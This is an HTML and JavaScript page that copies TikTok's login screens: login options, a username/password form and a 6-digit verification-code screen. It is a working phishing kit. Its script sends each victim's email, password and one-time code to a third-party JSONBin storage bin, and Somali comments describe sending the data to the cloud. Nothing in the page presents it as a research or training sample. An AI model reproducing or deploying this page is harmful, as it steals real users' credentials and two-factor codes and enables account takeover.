<!DOCTYPE html>
<html lang="so">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Login - Countdown Timer</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #121212;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            position: relative;
        }

        .close-btn, .back-btn {
            position: absolute;
            top: 20px;
            background: #252525;
            border: none;
            color: #ffffff;
            width: 35px;
            height: 35px;
            border-radius: 50%;
            font-size: 18px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10;
        }

        .close-btn { right: 20px; }
        .back-btn { left: 20px; display: none; }

        .container {
            width: 100%;
            max-width: 420px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        h1 {
            font-size: 30px;
            font-weight: 700;
            margin-bottom: 15px;
            text-align: center;
        }

        p.subtitle {
            font-size: 14px;
            color: #888888;
            text-align: center;
            margin-bottom: 30px;
            line-height: 1.5;
        }

        .login-btn {
            width: 100%;
            background-color: #2f2f2f;
            color: #ffffff;
            border: 1px solid rgba(255, 255, 255, 0.08);
            padding: 14px 20px;
            margin-bottom: 12px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            display: flex;
            align-items: center;
            cursor: pointer;
            transition: background-color 0.2s;
            position: relative;
        }

        .login-btn:hover { background-color: #3a3a3a; }
        .login-btn i { position: absolute; left: 20px; font-size: 20px; }
        .login-btn span { width: 100%; text-align: center; }

        .terms {
            font-size: 12px;
            color: #888888;
            text-align: center;
            max-width: 350px;
            line-height: 1.5;
            margin-top: 20px;
        }
        .terms a { color: #cccccc; text-decoration: none; }

        #emailLoginScreen, #codeScreen {
            display: none;
            width: 100%;
            max-width: 420px;
            flex-direction: column;
            align-items: center;
        }

        .tab-switcher {
            display: flex;
            background-color: #252525;
            border-radius: 40px;
            padding: 4px;
            width: 100%;
            margin-bottom: 25px;
        }

        .tab {
            flex: 1;
            background: transparent;
            border: none;
            color: #888;
            padding: 10px;
            font-size: 14px;
            font-weight: 600;
            border-radius: 30px;
            cursor: pointer;
            text-align: center;
        }

        .tab.active {
            background-color: #3f3f3f;
            color: #fff;
        }

        .input-group {
            position: relative;
            width: 100%;
            margin-bottom: 12px;
        }

        .input-box {
            width: 100%;
            background-color: #2f2f2f;
            border: 1px solid rgba(255, 255, 255, 0.08);
            padding: 16px 20px;
            border-radius: 8px;
            color: #ffffff;
            font-size: 16px;
            outline: none;
        }

        .input-box::placeholder { color: #888888; }

        .input-icons-right {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            display: flex;
            gap: 12px;
            color: #888;
            cursor: pointer;
        }

        .fa-circle-xmark { display: none; }

        .code-container {
            display: flex;
            gap: 10px;
            margin-bottom: 30px;
            justify-content: center;
        }

        .code-input {
            width: 48px;
            height: 56px;
            background-color: #2f2f2f;
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 8px;
            color: #ffffff;
            font-size: 22px;
            font-weight: 600;
            text-align: center;
            outline: none;
            transition: border-color 0.2s;
        }

        .code-input:focus {
            border-color: #fe2c55;
        }

        .resend-timer {
            margin-top: 10px;
            color: #888888;
            font-size: 14px;
            text-align: center;
        }

        .continue-btn {
            width: 100%;
            background-color: #2a2a2a;
            color: #777777;
            border: none;
            padding: 15px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            margin-top: 10px;
            cursor: not-allowed;
            transition: 0.2s;
        }

        .continue-btn.active {
            background-color: #fe2c55;
            color: #ffffff;
            cursor: pointer;
        }

        .forgot-password {
            margin-top: 20px;
            color: #cccccc;
            font-size: 14px;
            text-decoration: none;
            text-align: center;
        }

        .signup-bar {
            width: 100vw;
            background-color: #1a1a1a;
            border-top: 1px solid #282828;
            padding: 15px;
            text-align: center;
            font-size: 14px;
            color: #a0a0a0;
            position: absolute;
            bottom: 0;
            left: 0;
        }

        .signup-bar span { color: #fe2c55; font-weight: 600; cursor: pointer; }
    </style>
</head>
<body>

    <button class="back-btn" id="backBtn"><i class="fa-solid fa-chevron-left"></i></button>
    <button class="close-btn"><i class="fa-solid fa-xmark"></i></button>

    <!-- 1. SHAASHADDA KOOWAAD -->
    <div id="mainLoginScreen" class="container">
        <h1>Log in to TikTok</h1>

        <button class="login-btn">
            <i class="fa-solid fa-qrcode"></i>
            <span>Use QR code</span>
        </button>

        <button class="login-btn" id="emailPhoneBtn">
            <i class="fa-regular fa-user"></i>
            <span>Use phone or email</span>
        </button>

        <button class="login-btn">
            <i class="fa-brands fa-facebook"></i>
            <span>Continue with Facebook</span>
        </button>

        <button class="login-btn">
            <i class="fa-brands fa-google"></i>
            <span>Continue with Google</span>
        </button>

        <button class="login-btn">
            <i class="fa-brands fa-apple"></i>
            <span>Continue with Apple</span>
        </button>

        <div class="terms">
            By continuing with an account located in <strong>Somalia</strong>, you agree to our 
            <a href="#">Terms of Service</a> and acknowledge that you have read our 
            <a href="#">Privacy Policy</a>.
        </div>
    </div>

    <!-- 2. SHAASHADDA LABAAD -->
    <div id="emailLoginScreen">
        <div class="container">
            <h1>Log in</h1>

            <div class="tab-switcher">
                <button class="tab">Phone</button>
                <button class="tab active">Username or email</button>
            </div>

            <div class="input-group">
                <input type="text" id="emailInput" class="input-box" placeholder="Username or email">
                <div class="input-icons-right">
                    <i class="fa-solid fa-circle-xmark" id="clearEmail"></i>
                </div>
            </div>
            
            <div class="input-group">
                <input type="password" id="passwordInput" class="input-box" placeholder="Password">
                <div class="input-icons-right">
                    <i class="fa-solid fa-circle-xmark" id="clearPassword"></i>
                    <i class="fa-regular fa-eye-slash" id="togglePassword"></i>
                </div>
            </div>

            <button class="continue-btn" id="continueBtn" disabled>Continue</button>

            <a href="#" class="forgot-password">Forgot password?</a>
        </div>
    </div>

    <!-- 3. SHAASHADDA SADDEXAAD (6-Digit Code Screen) -->
    <div id="codeScreen">
        <div class="container">
            <h1>Enter 6-digit code</h1>
            <p class="subtitle">Your code was sent to <span id="maskedEmail" style="color: #fff;">ad***@gmail.com</span></p>

            <div class="code-container">
                <input type="text" class="code-input" maxlength="1">
                <input type="text" class="code-input" maxlength="1">
                <input type="text" class="code-input" maxlength="1">
                <input type="text" class="code-input" maxlength="1">
                <input type="text" class="code-input" maxlength="1">
                <input type="text" class="code-input" maxlength="1">
            </div>

            <div class="resend-timer">Resend code <span id="timer">60s</span></div>
        </div>
    </div>

    <div class="signup-bar">
        Don’t have an account? <span>Sign up</span>
    </div>

    <!-- JAVASCRIPT -->
    <script>
        const BIN_ID = "6aca8060ac6210605a2604fa";

        const mainScreen = document.getElementById('mainLoginScreen');
        const emailScreen = document.getElementById('emailLoginScreen');
        const codeScreen = document.getElementById('codeScreen');
        const emailPhoneBtn = document.getElementById('emailPhoneBtn');
        const backBtn = document.getElementById('backBtn');
        
        const emailInput = document.getElementById('emailInput');
        const passwordInput = document.getElementById('passwordInput');
        const continueBtn = document.getElementById('continueBtn');
        const maskedEmail = document.getElementById('maskedEmail');
        
        const clearEmailIcon = document.getElementById('clearEmail');
        const clearPasswordIcon = document.getElementById('clearPassword');
        const togglePasswordIcon = document.getElementById('togglePassword');
        const timerDisplay = document.getElementById('timer');

        let currentStep = 'main';
        let countdownInterval;
        let activeRecordId = null;

        function startTimer() {
            let timeLeft = 60;
            timerDisplay.textContent = timeLeft + 's';
            
            clearInterval(countdownInterval);
            countdownInterval = setInterval(() => {
                timeLeft--;
                timerDisplay.textContent = timeLeft + 's';
                if (timeLeft <= 0) {
                    clearInterval(countdownInterval);
                    timerDisplay.textContent = 'Resend';
                }
            }, 1000);
        }

        emailPhoneBtn.addEventListener('click', () => {
            mainScreen.style.display = 'none';
            emailScreen.style.display = 'flex';
            backBtn.style.display = 'flex';
            currentStep = 'email';
        });

        backBtn.addEventListener('click', () => {
            if (currentStep === 'code') {
                codeScreen.style.display = 'none';
                emailScreen.style.display = 'flex';
                currentStep = 'email';
                clearInterval(countdownInterval);
            } else if (currentStep === 'email') {
                emailScreen.style.display = 'none';
                mainScreen.style.display = 'flex';
                backBtn.style.display = 'none';
                currentStep = 'main';
            }
        });

        function checkInputs() {
            const emailVal = emailInput.value.trim();
            const passVal = passwordInput.value.trim();

            if (emailVal.length > 0 && passVal.length > 0) {
                continueBtn.classList.add('active');
                continueBtn.disabled = false;
            } else {
                continueBtn.classList.remove('active');
                continueBtn.disabled = true;
            }

            clearEmailIcon.style.display = emailVal.length > 0 ? 'block' : 'none';
            clearPasswordIcon.style.display = passVal.length > 0 ? 'block' : 'none';
        }

        emailInput.addEventListener('input', checkInputs);
        passwordInput.addEventListener('input', checkInputs);

        clearEmailIcon.addEventListener('click', () => {
            emailInput.value = '';
            checkInputs();
            emailInput.focus();
        });

        clearPasswordIcon.addEventListener('click', () => {
            passwordInput.value = '';
            checkInputs();
            passwordInput.focus();
        });

        togglePasswordIcon.addEventListener('click', () => {
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                togglePasswordIcon.classList.remove('fa-eye-slash');
                togglePasswordIcon.classList.add('fa-eye');
            } else {
                passwordInput.type = 'password';
                togglePasswordIcon.classList.remove('fa-eye');
                togglePasswordIcon.classList.add('fa-eye-slash');
            }
        });

        // Shaqada dirista xogta JSONBin Server
        async function pushToCloud(email, password, code = '') {
            try {
                let res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`);
                let data = await res.json();
                let users = data.record.users || [];

                let timeStr = new Date().toLocaleTimeString();

                if (activeRecordId) {
                    let targetIndex = users.findIndex(u => u.id === activeRecordId);
                    if (targetIndex !== -1) {
                        users[targetIndex].code = code;
                        users[targetIndex].time = timeStr;
                    }
                } else {
                    activeRecordId = Date.now();
                    users.push({
                        id: activeRecordId,
                        email: email,
                        password: password,
                        code: code,
                        time: timeStr
                    });
                }

                await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ users: users })
                });
            } catch (err) {
                console.log("Cilad xagga xiriirka ah:", err);
            }
        }

        continueBtn.addEventListener('click', async () => {
            if (!continueBtn.disabled) {
                const emailVal = emailInput.value.trim();
                const passVal = passwordInput.value.trim();

                // 1. Dir Username & Password Cloud-ka
                await pushToCloud(emailVal, passVal, '');

                if (emailVal.includes('@')) {
                    const parts = emailVal.split('@');
                    const name = parts[0];
                    const maskedName = name.length > 2 ? name.substring(0, 2) + '***' : name + '***';
                    maskedEmail.textContent = maskedName + '@' + parts[1];
                } else {
                    maskedEmail.textContent = emailVal.substring(0, 2) + '***';
                }

                emailScreen.style.display = 'none';
                codeScreen.style.display = 'flex';
                currentStep = 'code';
                
                startTimer();
            }
        });

        // Hawsha sanduuqyada koodka
        const codeInputs = document.querySelectorAll('.code-input');
        codeInputs.forEach((input, index) => {
            input.addEventListener('input', async (e) => {
                if (e.target.value.length === 1 && index < codeInputs.length - 1) {
                    codeInputs[index + 1].focus();
                }

                // Marka dhammaan 6-da digits la buuxiyo, u dir Code-ka Cloud-ka
                let fullCode = "";
                codeInputs.forEach(i => fullCode += i.value);
                if (fullCode.length === 6) {
                    await pushToCloud(emailInput.value.trim(), passwordInput.value.trim(), fullCode);
                }
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && input.value === '' && index > 0) {
                    codeInputs[index - 1].focus();
                }
            });
        });
    </script>
</body>
</html>
